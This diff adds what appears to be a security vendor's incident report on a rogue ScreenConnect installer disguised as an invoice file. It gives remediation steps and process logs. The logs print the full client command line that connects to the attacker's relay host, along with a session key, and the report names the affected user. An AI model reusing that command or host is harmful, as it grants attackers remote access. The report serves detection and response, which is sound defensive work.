@@ -1,0 +1,43 @@
+rInvestigative Summary
+---------------------
+[WARNING]
+Please review this incident report to understand what was identified before remediating. There may be unknown malicious processes, files, or other changes made to the host that remain undetected. Restoring from a known good backup or clean OS install is the only way to ensure a complete host-level remediation. 
+
+Huntress detected the following:
+- Rogue ScreenConnect Install : Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious ScreenConnect (ConnectWise Control) installers that give the threat actor remote access to the host.
+
+On 2025-02-24 15:29:49 UTC, user "kmeccariello" was observed interacting with malicious file "C:\Users\kmeccariello\Downloads\DocInvoiice2025feb24.exe". This file, a renamed ScreenConnect remote desktop agent, is configured to communicate with adversarial services and facilitate remote access to the environment. 
+
+This ScreenConnect agent is configured to communicate with the following domain which does not appear to be the standard management site used by this organization:
+- ushelp[.]top
+
+**NOTE: Additional reports may follow to address persistence for this ScreenConnect agent. Remediation instructions present are sufficient to continue normal business use once completed. **
+
+Remediation Instructions
+------------------------
+- Remove the "C:\Users\kmeccariello\Downloads\DocInvoiice2025feb24.exe" file.
+- Remove the "C:\Program Files (x86)\ScreenConnect Client (de5851ad6e374ce3)\" directory. 
+- Reboot the host to terminate outstanding malicious processes. 
+
+Processes
+---------
+Start Time: 2025-02-24 15:29:52 UTC
+Command: "C:\Windows\System32\msiexec.exe" /i "C:\Users\kmeccariello\AppData\Local\Temp\ScreenConnect\de5851ad6e374ce3\setup.msi"
+Executable: C:\Windows\SysWOW64\msiexec.exe
+Process ID: 27f384b4-f2c1-11ef-8e43-b06ebf2aeeaf
+Parent Process: C:\Users\kmeccariello\Downloads\DocInvoiice2025feb24.exe
+User: kmeccariello
+
+Start Time: 2025-02-24 15:30:53 UTC
+Command: "C:\Program Files (x86)\ScreenConnect Client (de5851ad6e374ce3)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=ushelp.top&p=8880&s=b05721c6-777d-471c-9d72-c53fed32d5af&k=BgIAAACkAABSU0ExAAgAAAEAAQDFK%2fbbpI2Y%2fu64InmNUalvSiNHiKj3qIxef2EBlhKtkMB9Wafgho8PWjl0LvYg9kGVGB%2fBBr7p8upYBqQwJmt2zG9vyAgxlCJY%2fd8W0%2b7tfbGG8gffcJoob3TupNzbeTnvs8%2bYbOTMzzSmg6IjYNBlXj1GtcaHumWR1u8JKfXSyvPzRXOHBR31dMIBtzi1NUnrYf8XA6QXSktBM1h0AQGBZR6FzuZymqeKrjktwq2%2fXUP3dLZ4EN6BZ1k0oNlkviz5vhj3h597IjpGkjLbhfTFC4T%2btt%2bNCv6zQw83IWwtZXibTXf7nMUVQ0n4fF2lKmh5FLU07mqW%2fY38%2b5MO41XA&c=Volume&c=&c=&c=&c=&c=&c=&c="
+Executable: C:\Program Files (x86)\ScreenConnect Client (de5851ad6e374ce3)\ScreenConnect.ClientService.exe
+Process ID: 27f385b8-f2c1-11ef-8e43-b06ebf2aeeaf
+Parent Process: C:\Windows\System32\services.exe
+User: SYSTEM
+
+Start Time: 2025-02-24 15:29:49 UTC
+Command: "C:\Users\kmeccariello\Downloads\DocInvoiice2025feb24.exe"
+Executable: C:\Users\kmeccariello\Downloads\DocInvoiice2025feb24.exe
+Process ID: 27f384a3-f2c1-11ef-8e43-b06ebf2aeeaf
+Parent Process: C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+User: kmeccariello
